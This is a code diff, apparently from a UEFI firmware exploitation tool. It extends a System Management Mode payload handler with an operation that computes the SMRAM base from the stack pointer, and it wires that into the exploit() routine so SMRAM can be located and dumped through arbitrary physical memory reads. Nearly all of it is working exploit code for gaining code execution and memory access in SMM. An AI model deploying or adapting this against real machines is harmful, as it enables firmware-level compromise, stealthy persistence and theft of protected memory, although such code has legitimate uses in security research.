@@ -20,6 +20,7 @@
 #define SMM_HANDLER_OP_PHYS_MEM_READ    1   // read physical memory from SMM
 #define SMM_HANDLER_OP_PHYS_MEM_WRITE   2   // write physical memory from SMM
 #define SMM_HANDLER_OP_EXECUTE          3   // execute SMM code at specified physical address
+#define SMM_HANDLER_OP_GET_SMRAM_ADDR   4   // return SMRAM region address
 
 // default size for TSEG/HSEG
 #define SMRAM_SIZE 0x800000
@@ -29,7 +30,7 @@ typedef void (* SMM_PROC)(void);
 typedef struct _SMM_HANDLER_CONTEXT
 {
     unsigned int op;
-    int status;
+    int status;    
 
     union
     {
@@ -54,6 +55,12 @@ typedef struct _SMM_HANDLER_CONTEXT
             SMM_PROC addr;
 
         } execute;
+
+        struct // for SMM_HANDLER_OP_GET_SMRAM_ADDR
+        {
+            unsigned long long addr;
+
+        } smram_addr;
     };
 
 } SMM_HANDLER_CONTEXT,
@@ -67,7 +74,7 @@ static void smm_handler(void *context)
     switch (handler_context->op)
     {
     case SMM_HANDLER_OP_NONE:
-
+        
         // do nothing
         status = 0;
         break;
@@ -107,12 +114,21 @@ static void smm_handler(void *context)
         status = 0;
         break;
 
+    case SMM_HANDLER_OP_GET_SMRAM_ADDR:
+
+        // calculate SMRAM address by stack pointer value
+        handler_context->smram_addr.addr = (unsigned long long)&status;
+        handler_context->smram_addr.addr &= ~(unsigned long long)(SMRAM_SIZE - 1);
+
+        status = 0;
+        break;
+
     default:
 
         break;
     }
 
-    handler_context->status = status;
+    handler_context->status = status;    
 }
 //--------------------------------------------------------------------------------------
 int test(void)
@@ -306,7 +322,7 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
-int exploit(PSMM_HANDLER_CONTEXT context, int target, PUEFI_EXPL_TARGET custom_target, const char *data_file)
+int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT context, const char *data_file)
 {
     int ret = -1;
     PSMM_HANDLER_CONTEXT c = context;
@@ -392,6 +408,10 @@ int exploit(PSMM_HANDLER_CONTEXT context, int target, PUEFI_EXPL_TARGET custom_t
                             hexdump(c->phys_mem_read.data, c->phys_mem_read.size);
                         }
                     }
+                    else if (c->op == SMM_HANDLER_OP_GET_SMRAM_ADDR)
+                    {
+                        context->smram_addr.addr = c->smram_addr.addr;
+                    }
 
                     ret = 0;
                 }
@@ -419,10 +439,13 @@ int exploit(PSMM_HANDLER_CONTEXT context, int target, PUEFI_EXPL_TARGET custom_t
     return ret;
 }
 //--------------------------------------------------------------------------------------
-unsigned long long smram_addr(void)
+unsigned long long smram_addr(int target, PUEFI_EXPL_TARGET custom_target)
 {
-    unsigned long long val = 0;
 
+#ifdef USE_SMRR
+
+    unsigned long long val = 0;
+    
     if (uefi_expl_msr_get(IA32_MTRRCAP, &val))
     {
         // check if IA32_SMRR_PHYSBASE and IA32_SMRR_PHYSMASK are available (11 bit)
@@ -446,6 +469,24 @@ unsigned long long smram_addr(void)
     {
         printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
     }    
+ 
+#else // USE_SMRR
+
+    SMM_HANDLER_CONTEXT context;
+    memset(&context, 0, sizeof(context));
+    context.op = SMM_HANDLER_OP_GET_SMRAM_ADDR;
+
+    // run exploitation to get SMRAM address
+    if (exploit(target, custom_target, &context, NULL) == 0)
+    {
+        return context.smram_addr.addr;
+    }
+    else
+    {
+        printf(__FUNCTION__"() ERROR: exploit() fails\n");
+    }
+
+#endif // USE_SMRR
 
     return 0;
 }
@@ -673,22 +714,28 @@ int _tmain(int argc, _TCHAR* argv[])
             
             // check for Intel VID
             if (vid == 0x8086)
-            {
-                // get current SMRAM address
-                unsigned long long addr = smram_addr();
-                if (addr)
+            {                
+                unsigned long long addr = 0; 
+                
+                if (use_smram_dump)
                 {
-                    printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);
+                    // get current SMRAM address
+                    addr = smram_addr(target, &custom_target);
+                }
 
+                if (!use_smram_dump || addr)
+                {                    
                     if (use_smram_dump)
                     {
+                        printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);
+
                         context.op = SMM_HANDLER_OP_PHYS_MEM_READ;
                         context.phys_mem_read.size = length ? length : SMRAM_SIZE;
                         context.phys_mem_read.addr = (void *)addr;
                     }
 
                     // run exploitation
-                    ret = exploit(&context, target, &custom_target, data_file);
+                    ret = exploit(target, &custom_target, &context, data_file);
                 }
                 else
                 {
